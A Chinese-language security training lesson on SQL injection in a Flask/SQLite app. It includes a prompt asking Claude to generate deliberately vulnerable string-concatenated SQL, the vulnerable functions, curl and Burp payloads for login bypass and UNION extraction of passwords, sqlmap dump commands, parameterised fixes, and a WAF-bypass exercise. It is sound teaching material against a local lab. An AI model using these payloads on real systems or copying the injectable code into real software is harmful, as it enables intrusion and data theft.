# Day 3 - SQL 注入漏洞

## 一、页面部署提示词

> 学生将此提示词发给 Claude，即可生成带 SQL 注入漏洞的功能：

```
在 Flask 项目中添加数据库操作功能，要求：
1. 用户注册时把数据存入 SQLite 数据库
2. 实现搜索用户功能：GET /search?keyword=xxx
3. SQL 查询直接用字符串拼接的方式构建
4. 登录时从数据库查询用户，也是字符串拼接
5. 不要使用 ORM 或参数化查询，方便初学者理解 SQL
6. 添加一些调试日志，方便观察执行的 SQL 语句
```

---

## 二、漏洞关键代码解释

### 漏洞 1：登录查询 SQL 注入

```python
# core/database.py
def query_users(username, password):
    conn = get_db_connection()
    cursor = conn.cursor()
    # ↓↓↓ 漏洞行：直接拼接用户输入到 SQL 语句
    query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
    print(f"[DEBUG] 执行查询: {query}")  # 调试日志方便观察注入效果
    cursor.execute(query)
    result = cursor.fetchone()
    conn.close()
    return result
```

**问题**：`username` 和 `password` 来自用户输入，直接拼接到 SQL 语句中。如果用户输入 `admin' OR '1'='1`，SQL 变成：

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = ''
```

由于 `OR '1'='1'` 永远为真，**跳过密码验证**，直接登录成功。

### 漏洞 2：搜索功能 SQL 注入

```python
def search_users(keyword):
    conn = get_db_connection()
    cursor = conn.cursor()
    # ↓↓↓ 漏洞行
    query = f"SELECT * FROM users WHERE username LIKE '%{keyword}%' OR email LIKE '%{keyword}%'"
    cursor.execute(query)
    results = cursor.fetchall()
    conn.close()
    return results
```

**问题**：`keyword` 直接拼入 LIKE 子句。攻击者可以注入 UNION 查询获取全部数据。

### 漏洞 3：注册功能 SQL 注入

```python
def add_user(username, password, email, phone):
    conn = get_db_connection()
    cursor = conn.cursor()
    # ↓↓↓ 漏洞行
    query = f"INSERT INTO users (username, password, email, phone) VALUES ('{username}', '{password}', '{email}', '{phone}')"
    cursor.execute(query)
    conn.commit()
    conn.close()
    return cursor.lastrowid
```

**问题**：注册输入也拼接 SQL，可进行二次注入或堆叠查询。

---

## 三、漏洞成因总结

| 漏洞 | 根本原因 | 危害 |
|------|---------|------|
| 万能密码登录 | 字符串拼接 SQL，`OR '1'='1'` 绕过 | 无需密码登录任意账号 |
| UNION 注入 | 搜索功能未过滤，可 UNION 查询 | 窃取所有数据库数据 |
| 注册注入 | INSERT 语句也拼接 | 篡改数据库内容 |
| 盲注风险 | 无任何输入过滤 | 可逐字符猜解数据 |

---

## 四、POC 代码

### POC 1：万能密码登录

```bash
# 使用 SQL 注入绕过登录验证
curl http://127.0.0.1:5000/login \
  -d "username=admin' OR '1'='1&password="
```

**预期结果**：即使密码为空，也能以 admin 身份登录成功。

### POC 2：搜索功能 UNION 注入

```bash
# 先登录获取 session
curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" \
  -c /tmp/cookies.txt

# UNION 注入：从 users 表提取所有数据
curl "http://127.0.0.1:5000/search?keyword=' UNION SELECT 1,'hacked','pwned','hack@x.com','13800000000','admin',99999 --" \
  -b /tmp/cookies.txt | grep "hacked"
```

**预期结果**：搜索结果中出现攻击者伪造的 `hacked` 用户。

### POC 3：SQLMap 自动化注入

```bash
# 获取 session cookie
SESSION=$(curl http://127.0.0.1:5000/login \
  -d "username=admin&password=admin123" \
  -c - | grep session | awk '{print $NF}')

# SQLMap 自动检测并利用
sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" \
  --cookie="session=$SESSION" \
  --batch \
  --dump
```

---

## 五、POC 代码测试方法（Burp Suite + SQLMap）

### 方法 1：手动测试（Burp Suite）

1. **拦截搜索请求**
   - 登录后，在搜索框输入 `admin`
   - Burp 中拦截到 `GET /search?keyword=admin`
   - 发送到 Repeater

2. **测试注入点**
   - 修改 keyword 参数为：`admin' OR '1'='1`
   - 如果返回更多结果，说明存在注入

3. **测试 UNION 注入**
   - 修改为：`' UNION SELECT 1,2,3,4,5,6,7 --`
   - 观察结果中是否出现 `2,3,4` 等数字

4. **提取数据**
   - 查询所有表：`' UNION SELECT name,sql,3,4,5,6,7 FROM sqlite_master --`
   - 提取密码：`' UNION SELECT username,password,3,4,5,6,7 FROM users --`

### 方法 2：SQLMap 自动化

```bash
# 自动检测注入点
sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" \
  --cookie="session=你的session值" \
  --batch \
  --level 3 \
  --risk 2

# 自动获取所有数据
sqlmap -u "..." --cookie="..." --batch --dump-all
```

---

## 六、POC 代码详细解释

### POC 1 详解：万能密码

```bash
curl http://127.0.0.1:5000/login \
  -d "username=admin' OR '1'='1&password="
```

**Payload 分析**：

| 输入 | 值 | 作用 |
|------|----|------|
| `username` | `admin' OR '1'='1` | 闭合前引号，插入 OR 永真条件 |
| `password` | 空 | 密码任意，因为永真条件跳过了密码检查 |

**生成的 SQL**：
```sql
SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' AND password = ''
```
       ^^^^^^^^^^^^   ^^^^^^^^^^^^
       正常条件       永真条件（使 WHERE 永远为 True）

**执行逻辑**：`WHERE (username='admin') OR ('1'='1' AND password='')`。由于 `'1'='1'` 永远为真，即使第一个条件不满足（用户不存在），整个 WHERE 子句也返回 True，**返回表中第一行用户的数据**。

### POC 2 详解：UNION 注入

```
搜索关键词: ' UNION SELECT 1,'hacked','pwned','hack@x.com','13800000000','admin',99999 --
```

**生成的 SQL**：
```sql
SELECT * FROM users 
WHERE username LIKE '%' UNION SELECT 1,'hacked','pwned','hack@x.com','13800000000','admin',99999 --%' 
      ^^^^^  UNION 关键字，将两个查询结果合并
             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
             攻击者控制的第二个查询，返回自定义数据
                                                                                                          ^^
                                                                                                          注释符，去掉后面内容
```

**注意**：UNION 要求两个 SELECT 返回的列数相同。users 表有 7 列，所以攻击者提供了 7 个值。通过逐个尝试列数（UNION SELECT 1,2,3...）可以确定正确的列数。

### POC 3 详解：SQLMap

```bash
sqlmap -u "http://127.0.0.1:5000/search?keyword=admin" \
  --cookie="session=..." --batch --dump
```

| 参数 | 含义 |
|------|------|
| `-u` | 目标 URL |
| `--cookie` | 认证 cookie（需要登录后才能搜索） |
| `--batch` | 自动选择默认选项，无需人工交互 |
| `--dump` | 导出所有数据库数据 |

SQLMap 会自动：
1. 检测注入点是否存在
2. 判断注入类型（UNION/布尔盲注/时间盲注）
3. 获取数据库类型和版本
4. 枚举所有表名和列名
5. 导出全部数据

---

## 七、修复方案

```python
# fix/database_fix.py
import sqlite3

def query_users_fixed(username, password):
    """使用参数化查询修复 SQL 注入"""
    conn = get_db_connection()
    cursor = conn.cursor()
    # 修复：使用 ? 占位符，数据库驱动会自动处理转义
    query = "SELECT * FROM users WHERE username = ? AND password = ?"
    cursor.execute(query, (username, password))  # 参数分开传递
    result = cursor.fetchone()
    conn.close()
    return result

def search_users_fixed(keyword):
    """参数化 LIKE 查询"""
    conn = get_db_connection()
    cursor = conn.cursor()
    # 修复：keyword 作为参数传入，即使用户输入 % 或 ' 也不会被解析为 SQL
    query = "SELECT * FROM users WHERE username LIKE ? OR email LIKE ?"
    cursor.execute(query, (f'%{keyword}%', f'%{keyword}%'))
    results = cursor.fetchall()
    conn.close()
    return results
```

**为什么参数化查询能防御 SQL 注入？**

```
用户输入:  admin' OR '1'='1

拼接方式（有漏洞）:
  f"WHERE username = '{username}'"
  → WHERE username = 'admin' OR '1'='1'    ← ' 闭合了字符串，OR 成为了 SQL 关键字

参数化方式（安全）:
  cursor.execute("WHERE username = ?", (username,))
  → WHERE username = "admin' OR '1'='1"     ← 整个输入被视为字符串值，' 不参与 SQL 解析
```

---

## 八、课后作业

1. 在 `fix/` 目录创建 `database_fix.py`，修复全部三个函数
2. 修改 `app.py` 中的导入，使用修复版本
3. 验证 POC 1、2、3 均无法利用
4. 尝试不同的注入 payload，理解参数化查询如何防御
5. （进阶）尝试用 sqlmap 的 `--tamper` 参数绕过简单 WAF
